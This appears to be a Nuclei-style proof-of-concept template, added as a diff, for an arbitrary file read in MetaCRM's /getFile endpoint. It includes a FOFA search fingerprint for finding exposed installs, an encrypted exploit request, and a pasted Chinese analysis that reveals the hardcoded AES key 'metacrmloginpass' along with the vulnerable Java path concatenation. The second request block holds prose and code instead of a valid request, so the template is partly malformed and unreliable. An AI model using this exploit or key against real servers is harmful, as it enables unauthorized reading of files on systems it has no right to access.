@@ -1,0 +1,38 @@
+id: poc-bk9h0wsg2dvuxp3s
+info:
+  name: 美特CRM getFile存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bk9h0wsg2dvuxp3s'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bk9h0wsg2dvuxp3s
+    fofa: body="/common/scripts/basic.js"
+http:
+- raw:
+  - 'GET /getFile?p=b9998b5475349fb121bb1c747c459f55427b7cbfdb484a28fbd4d9d992ab442923a2d0e2c189c9bae4c35e342dbb652c0711d79544ffef547bdbda75a26a27c6 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "看下AES加解密的部分\npublic class AesEcbCipher {\n    private static final String SECRET_KEY = \"metacrmloginpass\";\n    private byte[] key = \"metacrmloginpass\".getBytes();\n\n    public AesEcbCipher(String secretKey) {\n        this.key = secretKey.getBytes();\n    }\n\n    public AesEcbCipher() {\n    }\n\n    public String Encrypt(String sSrc) {\n        try {\n            SecretKeySpec skeySpec = new SecretKeySpec(this.key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(1, skeySpec);\n            byte[] encrypted = cipher.doFinal(sSrc.getBytes(\"UTF-8\"));\n            return (new BASE64Encoder()).encode(encrypted);\n        } catch (Exception ex) {\n            Debug.error(\"\", ex);\n            return null;\n        }\n    }\n\n    public String Decrypt(String sSrc) {\n        if (sSrc != null && sSrc.length() != 0) {\n            try {\n                SecretKeySpec skeySpec = new SecretKeySpec(this.key, \"AES\");\n                Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n                cipher.init(2, skeySpec);\n                byte[] encrypted1 = (new BASE64Decoder()).decodeBuffer(sSrc);\n                byte[] original = cipher.doFinal(encrypted1);\n                return new String(original, \"UTF-8\");\n            } catch (Exception ex) {\n                Debug.error(\"\", ex);\n                return sSrc;\n            }\n        } else {\n            return sSrc;\n        }\n    }\n\n    public String encrypt(String sSrc) {\n        try {\n            SecretKeySpec skeySpec = new SecretKeySpec(this.key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(1, skeySpec);\n            byte[] encrypted = cipher.doFinal(sSrc.getBytes(\"UTF-8\"));\n            return Hex.encodeHexStr(encrypted);\n        } catch (Exception ex) {\n            Debug.error(\"\", ex);\n            return null;\n        }\n    }\n\n    public String decrypt(String sSrc) {\n        if (sSrc != null && sSrc.length() != 0) {\n            try {\n                SecretKeySpec skeySpec = new SecretKeySpec(this.key, \"AES\");\n                Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n                cipher.init(2, skeySpec);\n                byte[] encrypted1 = Hex.decodeHex(sSrc.toCharArray());\n                byte[] original = cipher.doFinal(encrypted1);\n                return new String(original, \"UTF-8\");\n            } catch (Exception ex) {\n                Debug.error(\"\", ex);\n                return sSrc;\n            }\n        } else {\n            return sSrc;\n        }\n    }\n}\n硬编码密钥 metacrmloginpass ，加解密都是基于hex格式进行，即传入的数据为hex格式。\n文件读取\nString fileName = json.getString(\"fileName\");\nString folder = json.getString(\"folder\");\nString sCorpName = json.getString(\"sCorpName\");\nString securityCode = json.getString(\"securityCode\");\nUserState us = UserManager.getUserBySessionId(request.getSession().getId());\nif (us == null && !FileSecurityCode.checkSecurityCode(securityCode)) {\n    request.setAttribute(\"error\", (new ResourceService()).getDispMessage(\"error.common.upanddown.login\"));\n\n    try {\n        request.getRequestDispatcher(\"/common/images/default/limit.png\").forward(request, response);\n    } catch (ServletException e) {\n        Debug.error(\"\", e);\n    }\n\n} else {\n    FileSecurityCode.visits(securityCode);\n    response.setContentType(Path.getContentType(fileName));\n    String path;\n    if (\"attach\".equals(folder)) {\n        path = Path.getAttachAbsoluteDirectory(sCorpName);\n    } else if (\"template\".equals(folder)) {\n        path = Path.getTemplateAbsoluteDirectory(sCorpName);\n    } else if (\"userlogo\".equals(folder)) {\n        path = Path.getLogoAbsoluteDirectory(sCorpName);\n    } else if (\"messageserv\".equals(folder)) {\n        path = Path.getMessageServerAbsoluteDirectory(sCorpName);\n    } else if (\"picture\".equals(folder)) {\n        path = Path.getPictureAbsoluteDirectory(sCorpName);\n    } else if (\"skinbackground\".equals(folder)) {\n        path = Path.getBackgroundAbsoluteDirectory(sCorpName);\n    } else if (\"icon\".equals(folder)) {\n        path = Path.getIconAbsoluteDirectory(sCorpName);\n    } else {\n        path = Path.getTempAbsoluteDirectory(sCorpName);\n    }\n\n    path = path + fileName;\n    this.log.debug(\"path={}\", path);\n    FileInputStream fio = new FileInputStream(new File(path));\n    IOUtils.copyLarge(fio, response.getOutputStream());\n    IOUtils.closeQuietly(fio);\nAES解密后的内容经fastjson处理后，取出其中需要的 fileName 、folder、sCorpName、securityCode等，主要是path = path + fileName; 其中 path 与 fileName 都是用户可控，且对路径无任何校验或过滤，拼接后直接调用 new File(path) 进行文件操作，造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。\nGET /getFile/AES加密后的payload HTTP/1.1\nHost: {{Hostname}}\nCookie: JSESSIONID=2A6482AE7774FBC13DD7854E15CE90F4"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
